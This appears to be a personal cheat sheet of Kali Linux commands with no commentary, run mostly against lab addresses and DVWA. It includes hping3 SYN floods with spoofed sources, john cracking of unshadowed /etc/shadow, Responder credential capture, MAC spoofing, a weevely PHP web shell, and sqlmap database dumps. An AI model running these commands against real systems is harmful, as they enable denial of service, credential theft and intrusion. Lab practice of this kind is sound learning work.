sudo nmap -p1-1000 -O -sV -oA outfile scanme.nmap.org


#
sudo hping3 -S 10.0.2.4 -p 80 -c 1
sudo hping3 --traceroute -V -1 10.0.2.4
sudo hping3 --rand-source -c 15000 -d 120 -w 64 -S -p 80 --flood 10.0.2.4
sudo hping3 -a 10.0.2.6 -c 15000 -d 120 -w 64 -S -p 80 --flood 10.0.2.4

#
httrack https://gr8ayu.github.io
#
john --format=Raw-MD5 --wordlist=passlist.txt hashes.txt
john --format=Raw-MD5 -single hashes.txt
john --format=Raw-MD5 -incremental hashes.txt
john --show --format=Raw-MD5 hashes.txt

sudo adduser -r hello
sudo passwd hello
unshadow /etc/passwd /etc/shadow > file.txt
john file.txt
john --show file.txt


#
crunch 3 5 -f /usr/share/crunch/charset.lst mixalpha -o file.txt
crunch 3 3 -t ,%% -b 1kb -o file.txt
crunch 5 5 -f /usr/share/crunch/charset.lst ualpha -t A@@D@ -l a@aaa -c 100 -o file.txt
crunch 4 6 -p kali is great

#
ifconfig
ifconfig eth0 down
macchanger -r eth0
macchanger -m 00:d0:70:00:20:69 eth0
macchanger -s eth0
macchanger -p eth0
ifconfig eth0 update

#

responder -I -A eth0
responder -I eth0
responder -I -wbF eth0
cat /usr/share/responder/logs/HTTP-Basic-ClearText-10.0.2.15.txt

#
weevely generate password shell.php
weevely http://10.0.2.4/dvwa/hackable/uploads/shell.php password
ls
system_info
file_rm
file_upload
file_download

#
sudo apt-get install tor
service tor status
service tor start
nano /etc/proxychains4.conf
#(strict, dynamic, last line 5)
service tor restart
#(new tab no sudo) 
proxychains4 firefox google.com


fdisk -l
foremost -v -q -t jpg -i /dev/sda1 -o downloads

binwalk file1.apk #(-B)
binwalk -e file1.apk #(extract)
binwalk -E file1.apk #(entropy)
binwalk -Me file1.apk #(recursive)
binwalk -Mre file1.apk #(delete 0-size files)
binwalk -f file.log file1.apk #(log)
binwalk -W file1.apk file2.apk #(difference)





pipal -t 10 /usr/share/john/password.lst
pipal passlist.txt
pipal --list-checkers


cutycapt --url=https://www.google.com --out=file.png




sudo netdiscover -i wlan0 -r 192.168.0.1/16

sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id --dbs

sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id --dump


